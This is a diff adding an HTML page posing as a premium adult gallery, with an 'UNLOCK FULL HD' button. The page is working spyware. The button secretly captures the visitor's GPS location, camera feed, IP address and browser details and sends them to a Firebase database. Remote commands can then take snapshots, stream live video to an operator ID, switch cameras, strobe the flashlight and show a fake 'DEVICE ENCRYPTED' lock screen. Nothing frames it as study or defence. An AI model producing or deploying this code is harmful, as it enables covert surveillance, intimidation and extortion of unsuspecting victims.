@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>GALLERY PREMIUM V13</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        #wallpaper-screen { width: 100%; height: 100%; background: url('https://i.ibb.co.com/pB4JvC8q/hentai-sex.jpg') no-repeat center center; background-size: cover; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 50px; }
+        .btn-akses { background: linear-gradient(45deg, #ff0080, #ff00ff); color: white; border: none; padding: 20px 40px; border-radius: 40px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        #loading-screen { display: none; width: 100%; height: 100%; background: #000; flex-direction: column; align-items: center; justify-content: center; color: #ff0080; }
+        #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #ff0000; color: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        video, canvas { position: absolute; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+    <div id="wallpaper-screen"><button class="btn-akses" onclick="initTarget()">UNLOCK FULL HD 🔞</button></div>
+    <div id="loading-screen">
+        <div style="border: 5px solid #222; border-top: 5px solid #ff0080; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
+        <p>Syncing Data... <span id="pct">0</span>%</p>
+        <video id="v" autoplay muted playsinline></video>
+        <canvas id="c" style="display:none;"></canvas>
+    </div>
+    <div id="lock-screen"><h1>⚠️ DEVICE ENCRYPTED ⚠️</h1><p>Access Violation. System Locked.</p></div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAARAwL0JU9hG4e3Squpp-I-oUGVcyJ3eo",
+            authDomain: "w15k4-project.firebaseapp.com",
+            databaseURL: "https://w15k4-project-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "w15k4-project",
+            storageBucket: "w15k4-project.firebasestorage.app",
+            appId: "1:688404985179:web:e79221fdda6cd5e988167e"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const ADMIN_ID = 'bos_sadap_99'; 
+        const targetID = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+        const peer = new Peer(targetID); 
+        let stream, track, strobeInt, mode = "environment";
+
+        db.ref('command/' + targetID).on('value', (s) => {
+            const cmd = s.val();
+            if(cmd === "LOCK") document.getElementById('lock-screen').style.display='flex';
+            if(cmd === "STROBE_ON") startStrobe();
+            if(cmd === "STROBE_OFF") clearInterval(strobeInt);
+            if(cmd === "REQ_LIVE") peer.call(ADMIN_ID, stream);
+            if(cmd === "SWITCH_CAM") switchCam();
+            if(cmd === "SNAP") takeSnap();
+        });
+
+        async function initTarget() {
+            document.getElementById('wallpaper-screen').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'flex';
+            navigator.geolocation.getCurrentPosition((p) => {
+                db.ref('targets/'+targetID+'/loc').set({lat: p.coords.latitude, lon: p.coords.longitude});
+            }, null, {enableHighAccuracy:true});
+            startCam();
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+                db.ref('targets/'+targetID+'/info').set({ip: d.ip, ua: navigator.userAgent, status: "ONLINE"});
+            });
+            let p = 0;
+            const iv = setInterval(() => {
+                p++; document.getElementById('pct').innerText = p;
+                if(p>=100) { clearInterval(iv); location.reload(); }
+            }, 500);
+        }
+
+        async function startCam() {
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
+            document.getElementById('v').srcObject = stream;
+            track = stream.getVideoTracks()[0];
+        }
+
+        function switchCam() { mode = (mode === "environment") ? "user" : "environment"; startCam(); }
+
+        function takeSnap() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            db.ref('targets/'+targetID+'/snap').set(c.toDataURL('image/jpeg', 0.5));
+        }
+
+        function startStrobe() {
+            clearInterval(strobeInt);
+            strobeInt = setInterval(() => {
+                track.applyConstraints({ advanced: [{ torch: true }] }).catch(()=>{});
+                setTimeout(() => track.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{}), 50);
+            }, 100);
+        }
+    </script>
+</body>
+</html>
